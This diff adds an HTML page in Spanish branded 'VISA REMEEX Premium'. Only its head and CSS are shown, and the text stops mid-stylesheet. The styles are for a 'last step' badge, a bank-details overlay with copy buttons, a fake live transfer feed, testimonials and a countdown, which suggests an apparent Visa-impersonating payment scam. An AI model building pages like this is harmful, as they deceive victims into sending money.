@@ -1,0 +1,3538 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>VISA REMEEX Premium - Verificación Segura</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+  <meta name="description" content="Verificación de Seguridad, Proceso Protegido. VISA REMEEX Premium - Transferencias instantáneas y seguras.">
+  <meta name="author" content="REMEEX VISA">
+  <meta name="theme-color" content="#1a1f71">
+
+  <link rel="icon" href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" type="image/png">
+
+  <!-- Fuentes e Iconos -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+
+  <style>
+    :root {
+      /* ============ Variables globales para ambos estilos ============ */
+      --primary: #1a1f71; /* Azul oscuro de Visa */
+      --primary-light: #2c348e;
+      --primary-dark: #0d153e; /* Azul más oscuro */
+      --secondary: #3b82f6;
+      --accent: #60a5fa;
+      --success: #22c55e;
+      --success-dark: #16a34a;
+      --success-light: rgba(34, 197, 94, 0.1);
+      --danger: #ef4444;
+      --danger-dark: #dc2626;
+      --warning: #f59e0b;
+      --warning-dark: #d97706;
+      --warning-light: rgba(251, 191, 36, 0.1);
+
+      --border-white: #ffffff;
+      --border-gray: #d1d5db;
+      --border-light-blue: #93c5fd;
+
+      --background: #f8fafc;
+      --card-bg: rgba(255, 255, 255, 0.98);
+      --text-primary: #0f172a;
+      --text-secondary: #475569;
+      --text-light: #94a3b8;
+
+      --border-radius-xl: 28px;
+      --border-radius-lg: 24px;
+      --border-radius: 16px;
+      --border-radius-sm: 12px;
+
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      --transition-bounce: all 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+      --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05);
+      --shadow: 0 10px 20px rgba(0, 0, 0, 0.3), 0 6px 6px rgba(0, 0, 0, 0.2);
+      --shadow-lg: 0 25px 50px rgba(0, 0, 0, 0.3);
+
+      --aurora-gradient: linear-gradient(
+        120deg,
+        rgba(26, 31, 113, 0.4),
+        rgba(25, 35, 102, 0.3),
+        rgba(30, 40, 120, 0.3),
+        rgba(26, 31, 113, 0.2)
+      );
+      background-size: 400% 400%;
+
+      /* Nuevas variables para overlays */
+      --overlay-bg: rgba(0, 0, 0, 0.7);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+      font-family: 'Inter', sans-serif;
+      color: var(--text-primary);
+      line-height: 1.6;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 1rem;
+      overflow-x: hidden;
+    }
+
+    /* Contenedor principal */
+    .container {
+      max-width: 650px;
+      width: 100%;
+      margin-top: 2rem;
+      background: var(--card-bg);
+      border-radius: var(--border-radius-xl);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(10px);
+      border: 2px solid var(--border-white);
+      overflow: hidden;
+      position: relative;
+      opacity: 0;
+      transform: scale(0.95);
+      transition: opacity 0.3s ease-out, transform 0.3s ease-out;
+      animation: glow 6s ease infinite, border-blink 6s linear infinite;
+    }
+    .container.active {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    @keyframes glow {
+      0%, 100% {
+        box-shadow: 0 0 40px rgba(26, 31, 113, 0.5), 0 0 80px rgba(26, 31, 113, 0.3);
+      }
+      50% {
+        box-shadow: 0 0 70px rgba(26, 31, 113, 0.8), 0 0 100px rgba(26, 31, 113, 0.6);
+      }
+    }
+    @keyframes border-blink {
+      0%   { border-color: var(--border-white); }
+      33%  { border-color: var(--border-gray); }
+      66%  { border-color: var(--border-light-blue); }
+      100% { border-color: var(--border-white); }
+    }
+
+    /* Encabezado principal */
+    .header {
+      text-align: center;
+      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
+      color: #fff;
+      padding: 2.5rem 2rem;
+      position: relative;
+      overflow: hidden;
+      border-top-left-radius: var(--border-radius-xl);
+      border-top-right-radius: var(--border-radius-xl);
+      background-image: var(--aurora-gradient);
+      animation: aurora-animation 15s ease infinite;
+    }
+    @keyframes aurora-animation {
+      0%   { background-position: 0% 50%; }
+      50%  { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .header::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(120deg, transparent, rgba(255,255,255,0.6), transparent);
+      transform: skewX(-20deg);
+      opacity: 0;
+      z-index: 1;
+      animation: header-flash 3s infinite;
+    }
+    @keyframes header-flash {
+      0% {
+        left: -100%;
+        opacity: 0;
+      }
+      10% {
+        left: -50%;
+        opacity: 1;
+      }
+      50% {
+        left: 100%;
+        opacity: 1;
+      }
+      60% {
+        left: 100%;
+        opacity: 0;
+      }
+      100% {
+        left: 100%;
+        opacity: 0;
+      }
+    }
+    .header-logo {
+      display: block;
+      margin: 0 auto;
+      width: 80%;
+      max-width: 400px;
+      height: auto;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* Estado del proceso */
+    .process-state {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 12px;
+      margin-top: 20px;
+    }
+
+    .process-step {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background-color: rgba(255, 255, 255, 0.3);
+      position: relative;
+      transition: all 0.3s ease;
+    }
+
+    .process-step.active {
+      background-color: #fff;
+      box-shadow: 0 0 8px rgba(255, 255, 255, 0.8);
+    }
+
+    .process-step.completed {
+      background-color: var(--success);
+      box-shadow: 0 0 8px rgba(34, 197, 94, 0.8);
+    }
+
+    .process-label {
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.8);
+      margin-top: 8px;
+      text-align: center;
+    }
+
+    /* ============ Tarjeta simplificada (REDISEÑADA) ============ */
+    .dual-cards-container {
+      margin: -2rem 1.5rem 1.5rem 1.5rem;
+      position: relative;
+      z-index: 2;
+      display: flex;
+      gap: 15px;
+    }
+
+    .card {
+      flex: 1;
+      background: white;
+      color: var(--text-primary);
+      border-radius: var(--border-radius);
+      padding: 1.5rem;
+      box-shadow: var(--shadow-sm);
+      position: relative;
+      overflow: hidden;
+      min-height: 160px;
+      transition: var(--transition);
+      border: 1px solid var(--border-gray);
+    }
+    
+    .card:hover {
+      transform: translateY(-3px);
+      box-shadow: var(--shadow);
+    }
+
+    /* Cabecera de la tarjeta */
+    .card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 0.75rem;
+      position: relative;
+      z-index: 5;
+    }
+    .logo {
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      font-size: 1.2rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .logo i {
+      color: var(--primary);
+    }
+    
+    .bank-logo {
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      font-size: 1.2rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    
+    .bank-logo i {
+      color: var(--primary);
+    }
+    
+    .exchange-rate {
+      font-size: 0.8rem;
+      opacity: 0.8;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    /* Último paso badge */
+    .ultimo-paso-badge {
+      position: absolute;
+      top: -10px;
+      right: 15px;
+      background-color: var(--warning);
+      color: white;
+      padding: 3px 10px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      font-weight: bold;
+      box-shadow: var(--shadow-sm);
+      z-index: 10;
+    }
+
+    /* Sección de saldo */
+    .balance-section {
+      position: relative;
+      z-index: 5;
+      margin-bottom: 0.5rem;
+      padding-top: 0.5rem;
+    }
+    .balance-label {
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+      margin-bottom: 0.5rem;
+    }
+    .balance-amount {
+      font-size: 1.9rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+      color: var(--primary);
+    }
+
+    .bank-account-info {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      margin-top: 0.25rem;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    /* Secciones para ambas tarjetas */
+    .info-section {
+      position: relative;
+      z-index: 5;
+      height: 1.3rem;
+      margin-top: 0.75rem;
+    }
+    
+    .dynamic-text {
+      font-size: 0.7rem;
+      opacity: 0.85;
+      transition: opacity 0.5s;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      color: var(--text-secondary);
+    }
+
+    /* Spinner moderno */
+    .spinner {
+      display: inline-block;
+      width: 14px;
+      height: 14px;
+      position: relative;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+    .spinner-circle {
+      box-sizing: border-box;
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border: 2px solid transparent;
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spinnerRotate 1.5s linear infinite;
+    }
+    .spinner-inner {
+      display: block;
+      position: absolute;
+      left: 3px;
+      top: 3px;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background-color: var(--primary);
+      opacity: 0.7;
+      animation: spinnerPulse 1s ease-in-out infinite alternate;
+    }
+    @keyframes spinnerRotate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @keyframes spinnerPulse {
+      0% { transform: scale(0.8); opacity: 0.3; }
+      100% { transform: scale(1); opacity: 0.7; }
+    }
+
+    /* Dot loader (puntos suspensivos) */
+    .dot-loader {
+      display: inline-block;
+      font-size: 0.7rem;
+    }
+    .dot-loader::after {
+      content: "";
+      animation: dotAnimation 1.5s steps(1, end) infinite;
+      display: inline-block;
+      width: 1.5em;
+      text-align: left;
+    }
+    @keyframes dotAnimation {
+      0% { content: ""; }
+      33% { content: "."; }
+      66% { content: ".."; }
+      100% { content: "..."; }
+    }
+
+    /* ============ Estilos de las secciones, formularios, overlays ============ */
+    .progress-bar {
+      height: 16px;
+      background-color: #e2e8f0;
+      border-radius: var(--border-radius);
+      margin: 2rem;
+      overflow: hidden;
+      position: relative;
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+    }
+    .progress-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      width: 100%;
+      transition: width 0.6s ease-in-out;
+      border-radius: var(--border-radius);
+      position: relative;
+      overflow: hidden;
+    }
+    .progress-bar-fill::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -50%;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.3);
+      transform: skewX(-45deg);
+      animation: move 2s linear infinite;
+    }
+    @keyframes move {
+      0% { left: -50%; }
+      100% { left: 100%; }
+    }
+    .progress-text {
+      position: absolute;
+      width: 100%;
+      top: 50%;
+      transform: translateY(-50%);
+      text-align: center;
+      font-weight: bold;
+      color: #fff;
+      z-index: 3;
+    }
+
+    .section-content {
+      padding: 2rem;
+      opacity: 0;
+      transform: translateY(10px);
+      transition: all 0.4s ease-out;
+      display: none;
+    }
+    .section-content.active {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .section-content h2 {
+      margin-bottom: 1.5rem;
+      font-size: 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      color: var(--primary);
+    }
+    .section-content h2 i {
+      color: var(--primary);
+      font-size: 1.3rem;
+    }
+    .form-group {
+      margin-bottom: 1.75rem;
+    }
+    .form-label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+    }
+    .form-control {
+      width: 100%;
+      padding: 0.875rem 1.25rem;
+      border: 2px solid #e2e8f0;
+      border-radius: var(--border-radius);
+      font-size: 1rem;
+      background: #fff;
+      transition: var(--transition);
+      color: var(--text-primary);
+    }
+    .form-control:hover {
+      border-color: #cbd5e1;
+    }
+    .form-control:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.2);
+    }
+
+    .btn-container {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 1.5rem;
+      position: relative;
+      width: 100%;
+    }
+    
+    .btn-disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+
+    /* Botón con glow */
+    .btn-std-container {
+      position: relative;
+      width: auto;
+      min-width: 120px;
+      height: 50px;
+      margin: 0.5rem 0;
+    }
+    .btn-glow-effect {
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      right: -2px;
+      bottom: -2px;
+      background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
+      background-size: 200% 100%;
+      border-radius: 30px;
+      animation: border-glow 3s ease infinite;
+      filter: blur(15px);
+      opacity: 0.7;
+      z-index: 0;
+    }
+    @keyframes border-glow {
+      0%   { background-position: -100% 0; }
+      50%  { background-position: 100% 0; }
+      100% { background-position: -100% 0; }
+    }
+    .btn-glow {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: white;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      overflow: hidden;
+      box-shadow: 0 15px 25px rgba(0,0,0,0.3), inset 0 -4px 8px rgba(255,255,255,0.3);
+      transition: all 0.3s ease, transform 0.2s ease-in-out;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 0.9rem;
+    }
+    .btn-glow:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+    }
+    .btn-glow-content {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+    }
+    .btn-glow-initial {
+      opacity: 1;
+      transform: translateX(0);
+    }
+    .btn-glow:hover .btn-glow-initial {
+      opacity: 0;
+      transform: translateX(100%);
+    }
+    .btn-glow-hover {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      transform: translateX(-100%);
+      color: white;
+    }
+    .btn-glow:hover .btn-glow-hover {
+      opacity: 1;
+      transform: translateX(0);
+    }
+    .btn-glow-icon {
+      margin-left: 10px;
+    }
+
+    .btn-success {
+      background: linear-gradient(135deg, var(--success), #109648);
+    }
+    .btn-danger {
+      background: linear-gradient(135deg, var(--danger), #c81e1e);
+    }
+    .btn-warning {
+      background: linear-gradient(135deg, var(--warning), var(--warning-dark));
+    }
+
+    .btn-support {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0.75rem 1.5rem;
+      background: white;
+      color: var(--primary);
+      border: 2px solid var(--primary);
+      border-radius: var(--border-radius-sm);
+      font-weight: 600;
+      font-size: 0.95rem;
+      text-decoration: none;
+      transition: var(--transition);
+      box-shadow: var(--shadow-sm);
+    }
+    .btn-support:hover {
+      background: rgba(26, 31, 113, 0.05);
+      transform: translateY(-2px);
+      box-shadow: var(--shadow);
+    }
+    .btn-support i {
+      margin-right: 8px;
+    }
+
+    .signature-canvas {
+      border: 2px dashed var(--primary);
+      border-radius: var(--border-radius-sm);
+      width: 100%;
+      height: 220px;
+      background: #fff;
+      margin-bottom: 1rem;
+      position: relative;
+      cursor: crosshair;
+    }
+
+    .verification-section {
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+      border-radius: var(--border-radius);
+      border: 1px solid var(--border-gray);
+      background-color: #f9fafb;
+    }
+    .verification-section p {
+      text-align: justify;
+      color: var(--text-secondary);
+    }
+
+    .info-section-old {
+      background-color: #f9fafb;
+      border-radius: var(--border-radius);
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+      border: 1px solid var(--border-gray);
+    }
+    .info-section-old p {
+      text-align: justify;
+      margin-bottom: 0.8rem;
+      color: var(--text-primary);
+    }
+    .info-section-old ul,
+    .info-section-old ol {
+      padding-left: 1.5rem;
+      margin-bottom: 1rem;
+    }
+    .info-section-old li {
+      margin-bottom: 0.5rem;
+      text-align: justify;
+    }
+
+    .highlight-card {
+      background-color: #f0f9ff;
+      border-radius: var(--border-radius);
+      padding: 1.25rem;
+      margin: 1rem 0;
+      border: 1px solid rgba(59, 130, 246, 0.2);
+    }
+    .highlight-card p {
+      margin: 0;
+      line-height: 1.5;
+    }
+
+    /* Nuevos estilos para la información de garantía */
+    .guarantee-box {
+      background-color: var(--success-light);
+      border: 1px solid var(--success);
+      border-radius: var(--border-radius);
+      padding: 1.25rem;
+      margin: 1.5rem 0;
+      position: relative;
+    }
+    
+    .guarantee-box h3 {
+      color: var(--success);
+      font-size: 1.1rem;
+      margin-bottom: 0.75rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    
+    .guarantee-badge {
+      position: absolute;
+      top: -10px;
+      right: 15px;
+      background-color: var(--success);
+      color: white;
+      padding: 2px 10px;
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: bold;
+      box-shadow: var(--shadow-sm);
+    }
+
+    .section-subtitle {
+      margin-top: 1.5rem;
+      margin-bottom: 1rem;
+      font-size: 1.2rem;
+      color: var(--primary);
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .icon-list {
+      margin: 1rem 0;
+      padding-left: 0;
+      list-style: none;
+    }
+    .icon-list li {
+      margin-bottom: 0.8rem;
+      display: flex;
+      align-items: flex-start;
+      gap: 0.5rem;
+      font-size: 0.95rem;
+      color: var(--text-secondary);
+      text-align: justify;
+    }
+    .icon-list li i {
+      color: var(--primary);
+      font-size: 1.1rem;
+      margin-top: 2px;
+      flex-shrink: 0;
+    }
+
+    /* Selector de datos bancarios mejorado */
+    .bank-data-card {
+      background-color: var(--white);
+      border: 1px solid var(--primary);
+      border-radius: var(--border-radius);
+      padding: 1.5rem;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      margin: 1.5rem 0;
+      position: relative;
+      transition: all 0.3s ease;
+    }
+    
+    .bank-data-card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 15px rgba(0,0,0,0.15);
+    }
+    
+    .bank-data-card p {
+      margin: 0.5rem 0;
+      font-size: 1rem;
+      color: var(--text-primary);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    
+    .bank-data-card .data-label {
+      font-weight: 600;
+      color: var(--primary);
+      min-width: 80px;
+      margin-right: 10px;
+    }
+    
+    .bank-data-card .data-value {
+      font-weight: 500;
+      background-color: #f0f9ff;
+      padding: 4px 10px;
+      border-radius: 4px;
+      flex-grow: 1;
+      text-align: right;
+    }
+    
+    .copy-icon {
+      color: var(--primary);
+      cursor: pointer;
+      padding: 4px;
+      border-radius: 4px;
+      transition: var(--transition);
+      margin-left: 10px;
+    }
+    
+    .copy-icon:hover {
+      background-color: rgba(26, 31, 113, 0.1);
+    }
+    
+    .secure-badge {
+      position: absolute;
+      top: -10px;
+      left: 15px;
+      background-color: var(--success);
+      color: white;
+      padding: 3px 10px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      box-shadow: var(--shadow-sm);
+    }
+
+    /* Checkbox de confirmación mejorado */
+    .acceptance-container {
+      background-color: #f0f9ff;
+      border: 1px solid var(--border-light-blue);
+      border-radius: var(--border-radius);
+      padding: 1rem;
+      margin: 1.5rem 0;
+    }
+    
+    .acceptance-check {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 0.5rem;
+    }
+    
+    .acceptance-checkbox {
+      margin-top: 3px;
+      width: 18px;
+      height: 18px;
+      accent-color: var(--primary);
+    }
+    
+    .acceptance-text {
+      font-size: 0.9rem;
+      color: var(--text-secondary);
+    }
+    
+    .acceptance-text strong {
+      color: var(--primary);
+    }
+
+    /* Feed de actividad en tiempo real (mejorado para scroll vertical) */
+    .activity-feed {
+      background-color: #f9fafb;
+      border: 1px solid var(--border-gray);
+      border-radius: var(--border-radius);
+      padding: 1rem;
+      margin: 1.5rem 0;
+      height: 200px;
+      overflow: hidden;
+      position: relative;
+    }
+    
+    .activity-feed-inner {
+      position: relative;
+      height: 100%;
+      overflow: hidden;
+    }
+    
+    .activity-feed-title {
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--primary);
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    
+    .live-indicator {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 0.8rem;
+      color: var(--success);
+    }
+    
+    .live-dot {
+      width: 8px;
+      height: 8px;
+      background-color: var(--success);
+      border-radius: 50%;
+      animation: pulse 1.5s infinite;
+    }
+    
+    .feed-items {
+      position: relative;
+      height: calc(100% - 40px);
+      overflow: hidden;
+    }
+    
+    .feed-item {
+      font-size: 0.85rem;
+      padding: 0.5rem 0;
+      border-bottom: 1px solid var(--border-gray);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      animation: fadeIn 0.5s;
+    }
+    
+    .feed-item:last-child {
+      border-bottom: none;
+    }
+    
+    .feed-avatar {
+      width: 28px;
+      height: 28px;
+      background-color: var(--light-blue);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.7rem;
+      font-weight: 600;
+      color: var(--primary);
+      flex-shrink: 0;
+    }
+    
+    .feed-content {
+      flex-grow: 1;
+    }
+    
+    .feed-name {
+      font-weight: 600;
+      color: var(--text-primary);
+    }
+    
+    .feed-amount {
+      font-weight: 600;
+      color: var(--success);
+    }
+    
+    .feed-time {
+      font-size: 0.75rem;
+      color: var(--text-light);
+      flex-shrink: 0;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    /* Testimonios con desplazamiento horizontal */
+    .testimonials-section {
+      margin: 2rem 0;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .testimonial-carousel-container {
+      overflow: hidden;
+      position: relative;
+      border-radius: var(--border-radius);
+      box-shadow: var(--shadow);
+    }
+    
+    .testimonial-carousel {
+      display: flex;
+      transition: transform 0.5s ease;
+    }
+    
+    .testimonial-slide {
+      flex: 0 0 100%;
+      padding: 1.5rem;
+      background-color: white;
+      border-left: 4px solid var(--primary);
+    }
+    
+    @keyframes slideHorizontal {
+      from { transform: translateX(100%); }
+      to { transform: translateX(0); }
+    }
+    
+    .testimonial-content {
+      font-style: italic;
+      color: var(--text-secondary);
+      margin-bottom: 1rem;
+    }
+    
+    .testimonial-author {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .testimonial-avatar {
+      width: 40px;
+      height: 40px;
+      background-color: var(--light-blue);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      color: var(--primary);
+    }
+    
+    .testimonial-info h4 {
+      margin: 0;
+      font-size: 0.9rem;
+      color: var(--text-primary);
+    }
+    
+    .testimonial-info p {
+      margin: 0;
+      font-size: 0.8rem;
+      color: var(--text-light);
+    }
+    
+    .testimonial-rating {
+      color: gold;
+      font-size: 0.8rem;
+      margin-top: 2px;
+    }
+    
+    .testimonial-controls {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 1rem;
+    }
+    
+    .testimonial-dot {
+      width: 8px;
+      height: 8px;
+      background-color: var(--border-gray);
+      border-radius: 50%;
+      cursor: pointer;
+    }
+    
+    .testimonial-dot.active {
+      background-color: var(--primary);
+    }
+
+    /* Contador para el botón de Confirmación */
+    .countdown-timer {
+      text-align: center;
+      margin-top: 0.5rem;
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+    }
+    
+    .countdown-number {
+      display: inline-block;
+      background-color: var(--primary);
+      color: white;
+      border-radius: 4px;
+      padding: 2px 6px;
+      margin: 0 3px;
+      font-weight: 600;
+    }
+
+    /* Success Callout */
+    .success-callout {
+      background-color: var(--success-light);
+      border-left: 4px solid var(--success);
+      border-radius: var(--border-radius-sm);
+      padding: 1rem;
+      margin: 1.5rem 0;
+      display: flex;
+      align-items: flex-start;
+      gap: 15px;
+    }
+    
+    .success-callout i {
+      font-size: 1.5rem;
+      color: var(--success);
+      margin-top: 2px;
+    }
+    
+    .success-callout-content h4 {
+      margin: 0 0 0.5rem 0;
+      color: var(--success);
+      font-size: 1.1rem;
+    }
+    
+    .success-callout-content p {
+      margin: 0;
+      font-size: 0.9rem;
+      color: var(--text-secondary);
+    }
+    
+    /* Botones de navegación */
+    .navigation-button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0.75rem 1.5rem;
+      background: var(--primary);
+      color: white;
+      border-radius: var(--border-radius-sm);
+      font-weight: 600;
+      font-size: 0.95rem;
+      text-decoration: none;
+      transition: var(--transition);
+      box-shadow: var(--shadow-sm);
+      margin-top: 1rem;
+      border: none;
+      cursor: pointer;
+    }
+    
+    .navigation-button:hover {
+      background: var(--primary-light);
+      transform: translateY(-2px);
+      box-shadow: var(--shadow);
+    }
+    
+    .navigation-button i {
+      margin-right: 8px;
+    }
+    
+    /* Botón para ver datos bancarios */
+    .show-bank-data-btn {
+      display: block;
+      width: 100%;
+      padding: 1rem;
+      margin: 1.5rem 0;
+      background-color: #f0f9ff;
+      border: 1px solid var(--border-light-blue);
+      border-radius: var(--border-radius);
+      color: var(--primary);
+      font-weight: 600;
+      text-align: center;
+      cursor: pointer;
+      transition: var(--transition);
+      animation: blink-attention 1.5s infinite;
+    }
+    
+    .show-bank-data-btn:hover {
+      background-color: #e1f0ff;
+    }
+    
+    .show-bank-data-btn i {
+      margin-right: 8px;
+    }
+    
+    /* Animación para hacer parpadear el botón de datos bancarios */
+    @keyframes blink-attention {
+      0%, 100% { background-color: #f0f9ff; }
+      50% { background-color: #d1e5ff; }
+    }
+    
+    /* Overlay para datos bancarios */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: var(--overlay-bg);
+      backdrop-filter: blur(5px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+    }
+    
+    .overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    
+    .overlay-content {
+      background: white;
+      border-radius: var(--border-radius);
+      padding: 2rem;
+      max-width: 90%;
+      width: 500px;
+      max-height: 90vh;
+      overflow-y: auto;
+      position: relative;
+      box-shadow: var(--shadow-lg);
+      transform: scale(0.9);
+      transition: transform 0.3s ease;
+    }
+    
+    .overlay.active .overlay-content {
+      transform: scale(1);
+    }
+    
+    .overlay-close {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: transparent;
+      border: none;
+      color: var(--text-secondary);
+      font-size: 1.5rem;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    
+    .overlay-close:hover {
+      color: var(--primary);
+    }
+    
+    .overlay-title {
+      margin-bottom: 1.5rem;
+      color: var(--primary);
+      font-size: 1.3rem;
+      padding-right: 30px;
+    }
+
+    /* Preguntas frecuentes mejoradas */
+    .faq-section {
+      margin-top: 2rem;
+    }
+
+    .faq-item {
+      margin-bottom: 1rem;
+      border: 1px solid var(--border-gray);
+      border-radius: var(--border-radius);
+      overflow: hidden;
+      background-color: white;
+    }
+
+    .faq-question {
+      padding: 1rem;
+      background-color: #f9fafb;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: var(--transition);
+    }
+
+    .faq-question:hover {
+      background-color: #f0f9ff;
+    }
+
+    .faq-question i {
+      transition: transform 0.3s ease;
+    }
+
+    .faq-item.active .faq-question i {
+      transform: rotate(180deg);
+    }
+
+    .faq-answer {
+      padding: 0;
+      max-height: 0;
+      overflow: hidden;
+      transition: all 0.3s ease;
+    }
+
+    .faq-item.active .faq-answer {
+      padding: 1rem;
+      max-height: 1000px;
+    }
+
+    .faq-answer p {
+      margin-bottom: 0.5rem;
+    }
+
+    .faq-answer p:last-child {
+      margin-bottom: 0;
+    }
+
+    /* Botón de WhatsApp flotante */
+    .whatsapp-floating-btn {
+      position: fixed;
+      bottom: 30px;
+      right: 30px;
+      width: 60px;
+      height: 60px;
+      background-color: #25d366;
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      cursor: pointer;
+      z-index: 100;
+      transition: all 0.3s ease;
+    }
+
+    .whatsapp-floating-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .whatsapp-tooltip {
+      position: absolute;
+      right: 70px;
+      background-color: white;
+      padding: 8px 12px;
+      border-radius: 5px;
+      font-size: 0.8rem;
+      color: var(--text-secondary);
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      opacity: 0;
+      transform: translateX(10px);
+      transition: all 0.3s ease;
+      pointer-events: none;
+      width: 120px;
+      text-align: center;
+    }
+
+    .whatsapp-floating-btn:hover .whatsapp-tooltip {
